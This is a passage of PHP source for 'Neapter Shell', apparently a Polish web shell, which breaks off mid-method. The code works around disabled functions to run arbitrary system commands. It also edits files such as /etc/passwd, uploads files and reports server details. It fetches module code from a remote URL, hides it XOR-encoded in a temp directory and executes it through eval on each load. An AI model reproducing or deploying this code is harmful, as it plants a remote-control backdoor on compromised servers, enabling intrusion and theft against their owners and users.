<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

require_once dirname( __FILE__ ) . '/Lib/Arr.php';
require_once dirname( __FILE__ ) . '/Lib/Request.php';
require_once dirname( __FILE__ ) . '/Lib/ShellInterface.php';
require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';

/**
 * class Shell - Zarzadzanie serwerem
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @version 0.40
 *
 * @uses Arr
 * @uses Request
 * @uses Form
 */
class Shell
{
	/**
	 * Wersja
	 */
	const VERSION = '0.41 b111017';

	/**
	 * Help, natywne polecenia
	 */
	const HELP = '
help - Wyświetlanie pomocy
modules - Informacje o modułach
edit - Edycja oraz tworzenie nowego pliku
upload - Wrzucanie pliku na serwer
system, exec - Uruchomienie polecenia systemowego
info - Wyświetla informacje o systemie
logout - Wylogowanie';

	/**
	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
	 *
	 * format: sha1( $user . "\xff" . $pass );
	 *
	 * @access public
	 * @var    string
	 */
	public $sAuth;

	/**
	 * Czas generowania strony
	 *
	 * @access private
	 * @var    float
	 */
	private $fGeneratedIn;

	/**
	 * SafeMode ON / OFF
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bSafeMode;

	/**
	 * Tablica wylaczaonych funkcji
	 *
	 * @access private
	 * @var    array
	 */
	private $aDisableFunctions = array();

	/**
	 * Mozliwe jest wykonanie polecenia systemowego ?
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bExec = FALSE;

	/**
	 * Dzialamy w srodowisku Windows ?
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bWindows = FALSE;

	/**
	 * Komenda
	 *
	 * @access public
	 * @var    string
	 */
	public $sCmd;

	/**
	 * Lista parametrow
	 *
	 * @access public
	 * @var    array
	 */
	public $aArgv = array();

	/**
	 * Ilosc parametrow
	 *
	 * @access public
	 * @var    integer
	 */
	public $iArgc = 0;

	/**
	 * Lista opcji
	 *
	 * @access public
	 * @var    array
	 */
	public $aOptv = array();

	/**
	 * Ciag jako jeden wielki parametr
	 *
	 * @access public
	 * @var    string
	 */
	public $sArgv;

	/**
	 * Lista modulow i komend
	 *
	 *  [komenda1] => Modul1
	 *  [komenda2] => Modul2
	 *
	 * @access private
	 * @var    string
	 */
	private $aModules = array();

	/**
	 * Lista natywnych modulow
	 *
	 *  [komenda1] => nazwa_metody1
	 *  [komenda2] => nazwa_metody1
	 *
	 * @access private
	 * @var    string
	 */
	private $aNativeModules = array();

	/**
	 * Lista modulow
	 *
	 *  [Modul] => 'komenda1, komenda2'
	 *
	 * @access private
	 * @var    string
	 */
	private $aHelpModules = array();

	/**
	 * Style CSS
	 *
	 * @ignore
	 * @access private
	 * @var    string
	 */
	private $sStyleSheet;

	/**
	 * Katalog tymczasowy
	 *
	 * @access public
	 * @var    string
	 */
	public $sTmp;

	/**
	 * Funkcje systemowe
	 *
	 * @access public
	 * @var    array
	 */
	public $aSystemFunctions = array
	(
		'exec',
		'shell_exec',
		'passthru',
		'system',
		'popen',
		'proc_open'
	);

	/**
	 * Wlasciwosc potrzeba przy wyswietlaniu pliku pomocy z natywnych modulow
	 * takich jak getCommandEdit(), getCommandUpload() czy getCommandSystem()
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bHelp = FALSE;

	/**
	 * Unikalny klucz dla shella, za pomoca ktorego szyfrowane sa niektore dane
	 *
	 * @ignore
	 * @access public
	 * @var    string
	 */
	public $sKey;

	/**
	 * Specjalny prefix dla shella
	 *
	 * @ignore
	 * @access public
	 * @var    string
	 */
	public $sPrefix;

	/**
	 * Jezeli TRUE to dzialamy w srodowisku deweloperskim (wlaczane wyswietlanie i raportowanie bledow)
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bDev = FALSE;

	/**
	 * Jezeli TRUE to skrypty JavaScript sa wlaczone
	 *
	 * @access public
	 * @var     boolean
	 */
	public $bJs = TRUE;

	/**
	 * Konstruktor
	 *
	 * @uses   Request
	 *
	 * @access public
	 * @return void
	 */
	public function __construct()
	{
		/**
		 * Czas generowania strony
		 */
		$this -> fGeneratedIn = microtime( 1 );

		/**
		 * Locale
		 */
		setLocale( LC_ALL, 'polish.UTF-8' );

		/**
		 * Naglowek UTF-8
		 */
		header( 'Content-type: text/html; charset=utf-8' );

		/**
		 * @ignore
		 */
		$this -> sStyleSheet = file_get_contents( 'Styles/haxior.css' );

		/**
		 * Katalog tymczasowy
		 */
		if( isset( $_ENV['TMP'] ) && is_writable( $sDir = $_ENV['TMP'] ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( isset( $_ENV['TEMP'] ) && is_writable( $sDir = $_ENV['TEMP'] ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( isset( $_ENV['TMPDIR'] ) && is_writable( $sDir = $_ENV['TMPDIR'] ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( is_writable( $sDir = ini_get( 'session.save_path' ) ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( is_writable( $sDir = ini_get( 'upload_tmp_dir' ) ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( is_writable( $sDir = ini_get( 'soap.wsdl_cache_dir' ) ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( is_writable( $sDir = sys_get_temp_dir() ) )
		{
			$this -> sTmp = $sDir;
		}

		/**
		 * @see Request::init
		 *
		 * Dostep do zmiennych poprzez metody. Nie trzeba za kazdym razem uzywac konstrukcji:
		 *   ( isset( $_GET['test'] ) && ( $_GET['test'] === 'test' ) )
		 * tylko
		 *   ( Request::getGet( 'test' ) === 'test' )
		 */
		Request::init();

		/**
		 * Tryb deweloperski
		 */
		if( isset( $_GET['dev'] ) )
		{
			$this -> bDev = TRUE;
		}

		/**
		 * Wylaczenie JavaScript
		 */
		if( isset( $_GET['nojs'] ) )
		{
			$this -> bJs = FALSE;
		}

		/**
		 * disable_functions
		 */
		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
		{
			$aDisableFunctions = explode( ',', $sDisableFunctions );

			$this -> aDisableFunctions = array_map( create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ), $aDisableFunctions );
		}

		/**
		 * Czy dzialamy na Windowsie ?
		 */
		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );

		/**
		 * SafeMode
		 */
		$this -> bSafeMode = (boolean) ini_get( 'safe_mode' );

		/**
		 * Unikalny klucz
		 */
		$this -> sKey = sha1( $sScriptFilename = Request::getServer( 'SCRIPT_FILENAME' ), TRUE ) . md5( md5_file( $sScriptFilename ), TRUE ) . md5( $sScriptFilename, TRUE );

		/**
		 * Prefix
		 */
		$this -> sPrefix = substr( md5( $sScriptFilename ) . md5_file( $sScriptFilename ), 0, 10 ) . '_';

		/**
		 * Mozliwosc wywolania polecenia systemowego
		 */
		if( function_exists( 'pcntl_exec' ) )
		{
			$this -> aSystemFunctions[] = 'pcntl_exec';
		}

		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( $this -> aSystemFunctions, $this -> aDisableFunctions ) ) > 0 ) );

		/**
		 * Config
		 */
		error_reporting( $this -> bDev ? -1 : 0 );
		ignore_user_abort( 0 );

		/**
		 * Jesli SafeMode jest wylaczony
		 */
		if( ! $this -> bSafeMode )
		{
			ini_set( 'display_errors', (int) $this -> bDev );
			ini_set( 'max_execution_time', 0 );
			ini_set( 'memory_limit', '1024M' );
			ini_set( 'default_socket_timeout', 5 );
			ini_set( 'date.timezone', 'Europe/Warsaw' );
			ini_set( 'html_errors', 0 );
			ini_set( 'log_errors', 0 );
			ini_set( 'error_log', NULL );
		}
		else
		{
			date_default_timezone_set( 'Europe/Warsaw' );
		}

		/**
		 * p jak PURE
		 */
		if(    ! isset( $_GET['p'] )
		    && is_file( $sFilePath = $this -> sTmp . '/' . $this -> sPrefix . '_modules' )
		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
		)
		{
			/**
			 * f jak FLUSH
			 */
			if( isset( $_GET['f'] ) )
			{
				unlink( $sFilePath );
			}
			else
			{
				eval( '?>' . $this -> decode( $sData ) . '<?' );
			}
		}

		/**
		 * Lista dostepnych modulow natywnych
		 */
		$oReflection = new ReFlectionClass( 'shell' );
		$aHelpModules = $oReflection -> getMethods();

		foreach( $aHelpModules as $oMethod )
		{
			$sMethod = $oMethod -> getName();

			if( ! ( ( strncasecmp( $sMethod, 'getCommand', 10 ) === 0 ) && ( $sMethod !== 'getCommandCr3d1ts' ) ) )
			{
				continue ;
			}
			$this -> aNativeModules[ strtolower( substr( $sMethod, 10 ) ) ] = $sMethod;
		}

		/**
		 * Lista dostepnych modulow zewnetrznych
		 */
		$aClasses = get_declared_classes();

		foreach( $aClasses as $sClass )
		{
			/**
			 * Wyszukiwanie klas z prefixem Module
			 */
			if( ( strncmp( $sClass, 'Module', 6 ) === 0 ) && ( $sClass !== 'ModuleDummy' ) )
			{
				$oModule = new $sClass( $this );

				/**
				 * Klasa musi implementowac ShellInterface
				 */
				if( $oModule instanceof ShellInterface )
				{
					$aCommands = $oModule -> getCommands();

					foreach( $aCommands as $sCommand )
					{
						$this -> aModules[ $sCommand ] = $sClass;
					}

					$this -> aHelpModules[ $sClass ] = implode( ', ', $aCommands );
				}
			}
		}

		/**
		 * Chdir
		 */
		if(     is_file( $sFile = $this -> sTmp . '/' . $this -> sPrefix . 'chdir' )
		   && ( ( $sData = file_get_contents( $sFile ) ) !== FALSE )
		)
		{
			chdir( $this -> decode( $sData ) );
		}
	}

	/**
	 * Proste szyfrowanie ciągu z uzyiem XOR
	 *
	 * @param  string $sData Tekst do zaszyfrowania
	 * @param  string $sKey  [Optional]Klucz
	 * @return string        Zaszyfrowany ciag
	 */
	public function encode( $sData, $sKey = NULL )
	{
		/**
		 * Domyslny klucz
		 */
		if( $sKey === NULL )
		{
			$sKey = $this -> sKey;
		}

		/**
		 * Musza wystepowac jakies dane
		 */
		if( ( $iDataLen = strlen( $sData ) ) === 0 )
		{
			return NULL;
		}

		$iKeyLen = strlen( $sKey );

		$sNewData = NULL;

		/**
		 * Szyfrowanie
		 */
		for( $i = 0; $i < $iDataLen; ++$i )
		{
			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, $i % $iKeyLen, 2 ) ) );
		}

		return gzcompress( $sNewData, 9 );
	}

	/**
	 * Proste deszyfrowanie ciągu z uzyiem XOR
	 *
	 * @param  string $sData Tekst do deszyfracji
	 * @param  string $sKey  [Optional]Klucz
	 * @return string        Zdeszyfrowany ciag
	 */
	public function decode( $sData, $sKey = NULL )
	{
		/**
		 * Domyslny klucz
		 */
		if( $sKey === NULL )
		{
			$sKey = $this -> sKey;
		}

		/**
		 * Musza wystepowac jakies dane
		 */
		if( strlen( $sData ) === 0 )
		{
			return NULL;
		}

		$sData = gzuncompress( $sData );
		$iDataLen = strlen( $sData );

		$iKeyLen = strlen( $sKey );

		$sNewData = NULL;

		/**
		 * Deszyfrowanie
		 */
		for( $i = 0; $i < $iDataLen; ++$i )
		{
			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, $i % $iKeyLen, 2 ) ) );
		}

		return $sNewData;
	}

	/**
	 * Zwracanie nazwy hosta i portu
	 *
	 * @access private
	 * @param  integer $sHost Host / Host:port
	 * @return array          Host i port
	 */
	public function getHost( $sHost )
	{
		$iPort = 0;
		if( strpos( $sHost, ':' ) !== FALSE )
		{
			list( $sHost, $iPort ) = explode( ':', $sHost );
		}

		return array( $sHost, (int) $iPort );
	}

	/**
	 * Pobieranie statusu TAK / NIE
	 *
	 * @access private
	 * @param  boolean $bValue    Wartosc
	 * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
	 * @return string             Status
	 */
	private function getStatus( $bValue, $bNegative = FALSE )
	{
		return sprintf( '<span class="%s">%s</span>', ( ( $bNegative ? ! $bValue : $bValue ) ? 'green' : 'red' ), ( $bValue ? 'TAK' : 'NIE' ) );
	}

	/**
	 * Pobieranie menu
	 *
	 * @access private
	 * @return string  Menu w HTMLu
	 */
	private function getMenu()
	{
		return sprintf( 'Wersja PHP: <strong>%s</strong><br/>' .
				'SafeMode: %s<br/>' .
				'OpenBaseDir: <strong>%s</strong><br/>' .
				'Serwer Api: <strong>%s</strong><br/>' .
				'Serwer: <strong>%s</strong><br/>' .
				'TMP: <strong>%s</strong><br/>' .
				'Zablokowane funkcje: <strong>%s</strong><br/>',

				phpversion(),
				$this -> getStatus( $this -> bSafeMode, TRUE ),
				( ( ( $sBasedir = ini_get( 'open_basedir' ) ) === '' ) ? $this -> getStatus( 0, TRUE ) : $sBasedir ),
				php_sapi_name(),
				php_uname(),
				$this -> sTmp,
				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'Brak' : $sDisableFunctions )
		);
	}

	/**
	 * Komenda - modules
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandModules()
	{
		/**
		 * Help
		 */
		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
modules - Informacje o modułach

	Użycie:
		modules loaded - lista załadowanych modułów - polecenia
		modules version - wyświetlanie wersji modułów

		modules ścieżka_do_pliku_z_modułami

	Przykład:
		modules loaded
		modules version
		modules /tmp/modules
		modules http://example.com/modules.txt
DATA;
		}

		/**
		 * Lista dostepnych modulow
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'loaded' ) )
		{
			$aModules = array_merge( array_keys( $this -> aNativeModules ),
				array_map(
					create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ),	array_keys( $this -> aHelpModules )
				)
			);

			sort( $aModules );

			return sprintf( "Załadowano %s modułów:\r\n\t%s", count( $aModules ), implode( "\r\n\t", $aModules ) );
		}

		/**
		 * Wyswietlanie wersji bibliotek
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'version' ) )
		{
			/**
			 * Szukanie najdluzszej nazwy modulu
			 */
			$iMaxLen = 0;
			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				if( ( $iLen = strlen( $sModule ) ) > $iMaxLen )
				{
					$iMaxLen = $iLen;
				}
			}

			/**
			 * Wersja modulu
			 */
			$sOutput = NULL;
			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				$oModule = new $sModule( $this );

				$sOutput .= str_pad( $sModule, $iMaxLen, ' ' ) . ' - ' . $oModule -> getVersion() . "\r\n";
			}

			return htmlspecialchars( $sOutput );
		}

		/**
		 * Pobieranie pliku z http
		 */
		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
		{
			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
			{
				return 'Nie można pobrać pliku z modułami';
			}
		}
		/**
		 * Wczytywanie pliku
		 */
		else
		{
			if( ! ( is_file( $this -> aArgv[0] ) && ( ( $sData = file_get_contents( $this -> aArgv[0] ) ) !== FALSE ) ) )
			{
				return 'Nie można wczytać pliku z modułami';
			}
		}

		/**
		 * Szyfrowanie zawartosci pliku
		 */
		file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . '_modules', $this -> encode( $sData ) );

		header( 'Refresh:1;url=' . Request::getCurrentUrl() );

		return 'Plik z modułami został załadowany';
	}

	private function getCommandCr3d1ts()
	{
		return <<<DATA
Jakieś sugestie, pytania?
	Pisz śmiało: Krzychu - <a href="mailto:krzotr@gmail.com">krzotr@gmail.com</a>
DATA;
	}

	/**
	 * Komenda - help
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandHelp()
	{
		if( $this -> bHelp )
		{
			return <<<DATA
help - Wyświetlanie pomocy

	Użycie:
		help
DATA;
		}

		$iMaxLen = 0;

		/**
		 * Szukanie najdluzszego ciagu (najdluzsza komenda)
		 */
		foreach( $this -> aHelpModules as $sModuleCmd )
		{
			if( ( $iLen = strlen( $sModuleCmd ) ) > $iMaxLen )
			{
				$iMaxLen = $iLen;
			}
		}

		$sOutput = NULL;

		/**
		 * Formatowanie natywnego helpa
		 */
		$aHelp = array_filter( preg_split( '~\r\n|\n|\r~', self::HELP ) );

		/**
		 * Szukanie najdluzszego ciagu (najdluzsza komenda)
		 */
		if( $iMaxLen === 0 )
		{
			foreach( $aHelp as $sLine )
			{
				if( ( $iLen = strpos( $sLine, '-' ) ) > $iMaxLen )
				{
					$iMaxLen = $iLen;
				}
			}
		}

		/**
		 * Formatowanie naglowkow z natywnych modulow
		 */
		foreach( $aHelp as $sLine )
		{
			$iPos = strpos( $sLine, '-' );

			$sOutput .= str_pad( substr( $sLine, 0, $iPos ), $iMaxLen, ' ' ) . rtrim( substr( $sLine, $iPos -  1 ) ) . "\r\n";
		}

		/**
		 * Formatowanie naglowkow z zewnetrznych modulow
		 */
		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
		{
			$oModule = new $sModule( $this );

			$sHelp = $oModule -> getHelp();

			$iPos = ( ( ( $iPos = strpos( $sHelp, "\n" ) ) !== FALSE ) ? $iPos : strlen( $sHelp ) );
			$sOutput .= str_pad( $sModuleCmd, $iMaxLen, ' ' ) . ' - ' . trim( substr( $sHelp, 0, $iPos ) ) . "\r\n";
		}

		$sOutput .= "\r\n\r\n";

		/**
		 * Wymuszenie uzycia pliku pomocy dna natywnych polecen
		 */
		$this -> bHelp = TRUE;

		/**
		 * Formatowanie natywnych helpow
		 */
		foreach( $this -> aNativeModules as $sModule => $sMethod  )
		{
			$sOutput .= $this -> $sMethod( TRUE )  . "\r\n\r\n\r\n";
		}

		/**
		 * Caly help
		 */
		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
		{
			$oModule = new $sModule( $this );

			$sOutput .= $sModuleCmd . ' - ' . $oModule -> getHelp() . "\r\n\r\n\r\n";
		}

		return htmlspecialchars( substr( $sOutput, 0, -6 ) );
	}

	/**
	 * Komenda - cd
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandCd()
	{
		if( $this -> bHelp  || ( $this -> iArgc !== 1 ) )
		{
			return <<<DATA
Zmiana aktualnego katalogu

	Użycie:
		cd sciezka

	Przykład:
		cd /tmp
DATA;
		}

		if( chdir( $this -> sArgv ) )
		{
			file_put_contents( $this -> sTmp . '/' . $this -> sPrefix . 'chdir', $this -> encode( $this -> sArgv ) );

			return sprintf( "Katalog zmieniono na:\r\n\t%s", getcwd() );
		}

		return 'Nie udało się zmienić katalogu!!!';
	}

	/**
	 * Wykonanie polecenia systemowago
	 *
	 * @access public
	 * @param  string $sCmd Komenda
	 * @return string
	 */
	public function getCommandSystem( $sCmd )
	{
		if( $this -> bHelp )
		{
			return <<<DATA
system - Uruchomienie polecenia systemowego

	Użycie:
		system polecenie - uruchomienie polecenia

	Przykład:
		system ls -la
DATA;
		}

		/**
		 * Jezeli safemode jest wylaczony
		 */
		if( ! $this -> bSafeMode )
		{
			if( strncmp( $sCmd, 'cd ', 3 ) === 0 )
			{
				chdir( substr( $sCmd, 3 ) );
			}

			ob_start();
			/**
			 * system
			 */
			if( ! in_array( 'system', $this -> aDisableFunctions ) )
			{
				echo "system():\r\n\r\n";
				system( $sCmd );
			}
			/**
			 * shell_exec
			 */
			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
			{
				echo "shell_exec():\r\n\r\n";
				echo shell_exec( $sCmd );
			}
			/**
			 * passthru
			 */
			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
			{
				echo "passthru():\r\n\r\n";
				passthru( $sCmd );
			}
			/**
			 * exec
			 */
			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
			{
				echo "exec():\r\n\r\n";
				exec( $sCmd, $aOutput );
				echo implode( "\r\n", $sLine ) . "\r\n";
			}
			/**
			 * popen
			 */
			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
			{
				echo "popen():\r\n\r\n";
				$rFp = popen( $sCmd, 'r' );

				if( is_resource( $rFp ) )
				{
					while( ! feof( $rFp ) )
					{
						echo fread( $rFp, 1024 );
					}
				}
			}
			/**
			 * proc_open
			 */
			else if( ! in_array( 'proc_open', $this -> aDisableFunctions ) )
			{
				echo "proc_open():\r\n\r\n";
				$rFp = proc_open( $sCmd, array
					(
						array( 'pipe', 'r' ),
						array( 'pipe', 'w' )
					),
					$aPipe
				);

				if( is_resource( $rFp ) )
				{
					while( ! feof( $aPipe[1] ) )
					{
						echo fread( $aPipe[1], 1024 );
						usleep( 10000 );
					}
				}
			}
			/**
			 * pcntl_exec
			 */
			else if( function_exists( 'pcntl_exec' ) && ! in_array( 'pcntl_exec', $this -> aDisableFunctions ) )
			{
				echo "pcntl_exec():\r\n\r\n";
				$sPath = NULL;
				$aArgs = array();
				if( ( $iPos = strpos( $sCmd, ' ') ) === FALSE )
				{
					$sPath = $sCmd;
				}
				else
				{
					$sPath = substr( $sCmd, 0, $iPos );
					$aArgs = explode( ' ', substr( $sCmd, $iPos + 1 ) );
				}
				pcntl_exec( $sPath, $aArgs );
			}
			else
			{
				echo 'Wszystkie funkcje systemowe są poblokowane !!!';
			}

			$sData = ob_get_contents();
			ob_clean();
			ob_end_flush();

			return htmlspecialchars( $sData );
		}

		return 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
	}

	/**
	 * Edycja pliku
	 *
	 * @access private
	 * @param  string         $sCmd Sciezka do pliku
	 * @return string|boolean
	 */
	private function getCommandEdit( $sFile )
	{
		/**
		 * Help
		 */
		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
edit - Edycja oraz tworzenie nowego pliku

	Użycie:
		edit /etc/passwd
		edit /sciezka/do/nowego/pliu
DATA;
		}

		/**
		 * Zapis do pliku
		 */
		if( ( $sFiledata = Request::getPost( 'filedata' ) ) !== FALSE )
		{
			return (boolean) file_put_contents( $sFile, $sFiledata );
		}

		/**
		 * Formularz
		 */
		return sprintf( '<form action="%s" method="post">' .
			'<textarea id="console" name="filedata">%s</textarea><br/>' .
			'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
			'<input type="submit" name="submit" value="Zapisz" id="cmd-send"/></form>',
			Request::getCurrentUrl(),
			( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ),
			htmlspecialchars( Request::getPost( 'cmd' ) )
		);
	}

	/**
	 * Wylogowanie
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandLogout()
	{
		/**
		 * Help
		 */
		if( $this -> bHelp )
		{
			return <<<DATA
logout - Wylogowanie

	Użycie:
		logout
DATA;
		}

		/**
		 * Sciezka do pliku
		 */
		$sFilepath = $this -> sTmp . '/' . $this -> sPrefix . md5( Request::getServer( 'REMOTE_ADDR' ) . Request::getServer( 'USER_AGENT' ) ) . '_auth';

		/**
		 * Czy plik z autoryzacja istnieje
		 */
		if( is_file( $sFilepath ) )
		{
			/**
			 * Usuwanie pliku
			 */
			if( unlink( $sFilepath ) )
			{
				return 'Zostałeś wylogowany';
			}
			else
			{
				return 'Nie zostałeś wylogowany';
			}
		}

		return 'Nie jesteś zalogowany, więc nie możesz się wylogować !!!';
	}

	/**
	 * Wrzucanie pliku
	 *
	 * @access private
	 * @param  string         $sCmd Sciezka do pliku
	 * @return string|boolean
	 */
	private function getCommandUpload( $sFile )
	{
		/**
		 * Help
		 */
		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
upload - Wrzucanie pliku na serwer

	Użycie:
		upload /tmp/plik.php
DATA;
		}

		/**
		 * Zapis do pliku
		 */
		if( ( $aFiledata = Request::getFiles( 'file' ) ) !== FALSE )
		{
			return move_uploaded_file( $aFiledata['tmp_name'], $sFile );
		}
		/**
		 * Formularz
		 */
		return sprintf( '<form action="%s" method="post" enctype="multipart/form-data">' .
			'<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
			'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
			'<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
			Request::getCurrentUrl(),
			htmlspecialchars( Request::getPost( 'cmd' ) )
		);
	}

	/**
	 * Wykonanie polecenia systemowago
	 *
	 * @access public
	 * @param  string $sCmd Komenda
	 * @return string
	 */
	private function getCommandInfo()
	{
		/**
		 * Help
		 */
		if( $this -> bHelp || ( $this -> iArgc !== 0 ) )
		{
			return <<<DATA
info - Wyświetla informacje o systemie

	Użycie:
		info
DATA;
		}

		return sprintf( "- SERVER:[%s], IP:[%s], Host:[%s]\r\nPHP:[%s], API:[%s], Url:[%s], Path:[%s]\r\nSAFE_MODE:[%d], EXE:[%d], CURL:[%d], SOCKET:[%s]",
			php_uname(),
			( $sIp = Request::getServer( 'REMOTE_ADDR' ) ),
			gethostbyaddr( $sIp ),
			PHP_VERSION,
			php_sapi_name(),
			( ( PHP_SAPI === 'cli ') ? 'CLI' : Request::getCurrentUrl() ),
			Request::getServer( 'SCRIPT_FILENAME' ),
			(int) $this -> bSafeMode,
			(int) $this -> bExec,
			function_exists( 'curl_init' ),
			function_exists( 'socket_create' )

		);
	}

	/**
	 * Domyslna akcja, dostep do konsoli
	 *
	 * @uses   Request
	 * @uses   Form
	 *
	 * @access public
	 * @return string
	 */
	public function getActionBrowser( $sCmd = NULL )
	{
		$bRaw = ( $sCmd !== NULL );

		/**
		 * Wlasna zawartosc strony; domyslnie znajduje sie okno konsoli
		 * linia polecen i przycisk 'Execute'
		 */
		$bOwnContent = FALSE;

		/**
		 * Zawartosc strony
		 */
		$sContent = NULL;

		/**
		 * Zawartosc konsoli
		 */
		$sConsole = NULL;

		/**
		 * Domyslna komenda to :ls -l sciezka_do_katalogu
		 */
		if( $sCmd === NULL )
		{
			if( PHP_SAPI === 'cli' )
			{
				/**
				 * Zmienne globalne to zlo ;), to powinno zostac przekazane
				 * jako parametr w konstruktorze ... ale coz ...
				 */
				$aArgv = $GLOBALS['argv'];
				array_shift( $aArgv );

				$sCmd = implode( $aArgv, ' ' );
			}
			else if( Request::getPost( 'cmd' ) === FALSE  )
			{
				$sCmd = ':ls -l ' . dirname( Request::getServer( 'SCRIPT_FILENAME' ) );
			}
			else
			{
				$sCmd = (string) Request::getPost( 'cmd' );
			}
		}

		/**
		 * Komendy shella rozpoczynaja sie od znaku ':'
		 */
		if( substr( $sCmd, 0, 1 ) === ':' )
		{
			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
			{
				$this -> sCmd = substr( $sCmd, 1, $iPos );
			}
			else
			{
				$this -> sCmd = (string) substr( $sCmd, 1 );
			}

			$this -> sArgv = ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) );

			/**
			 * Rozdzielanie argumentow
			 *
			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
			 */
			if( preg_match_all( '~\'(?:(?:\\\')|.+?)\'|"(?:(?:\\")|.+?)"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
			{
				/**
				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
				 *
				 * Dalbym tutaj lambde, ale php 5.2 tego nie obsluguje ...
				 */
				array_walk( $aMatch[0], array( $this, 'parseArgv' ) );

				$this -> aArgv = $aMatch[0];

				if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
				{
					$this -> aOptv = str_split( substr( $this -> aArgv[0], 1 ) );
					array_shift( $this -> aArgv );
					$this -> sArgv = ltrim( implode( ' ', $this -> aArgv ) );
				}
			}

			$this -> sArgv = $this -> rmQuotes( rtrim( $this -> sArgv ) );

			$this -> iArgc = count( $this -> aArgv );

			/**
			 *  Lista komend i aliasy
			 */
			switch( $this -> sCmd )
			{
				case 'help':
					$sConsole = $this -> getCommandHelp();
					break ;
				case 'cd':
					$sConsole = $this -> getCommandCd();
					break ;
				case 'modules':
					$sConsole = $this -> getCommandModules();
					break ;
				case 'cr3d1ts':
					$sConsole = $this -> getCommandCr3d1ts();
					break ;
				case 'system':
				case 'exec':
					$sConsole = $this -> getCommandSystem( $this -> sArgv );
					break ;
				case 'info':
					$sConsole = $this -> getCommandInfo();
					break ;
				case 'logout':
					$sConsole = $this -> getCommandLogout();
					break ;
				case 'edit':
					$mContent = $this -> getCommandEdit( $this -> sArgv );

					if( is_bool( $mContent ) )
					{
						$sConsole = sprintf( 'Plik %szostał zapisany', ( ! $mContent ? 'nie ' : NULL ) );
					}
					/**
					 * Help
					 */
					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
					{
						$sConsole = $mContent;
					}
					/**
					 * Formularz sluzacy do edycji pliku
					 */
					else
					{
						$bOwnContent = TRUE;
						$sContent = $mContent;
					}
					break ;
				case 'upload':
					$mContent = $this -> getCommandUpload( $this -> sArgv );

					if( is_bool( $mContent ) )
					{
						$sConsole = sprintf( 'Plik %szostał wrzucony', ( ! $mContent ? 'nie ' : NULL ) );
					}
					/**
					 * Help
					 */
					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
					{
						$sConsole = $mContent;
					}
					/**
					 * Formularz sluzacy do wrzucenia pliku
					 */
					else
					{
						$bOwnContent = TRUE;
						$sContent = $mContent;
					}
					break ;
				default :
					if( $this -> aModules === array() )
					{
						$sConsole = 'Nie wczytano żadnych modułów !!!';
					}
					else if( array_key_exists( $this -> sCmd, $this -> aModules ) )
					{
						$sModule = $this -> aModules[ $this -> sCmd ];
						$oModule = new $sModule( $this );

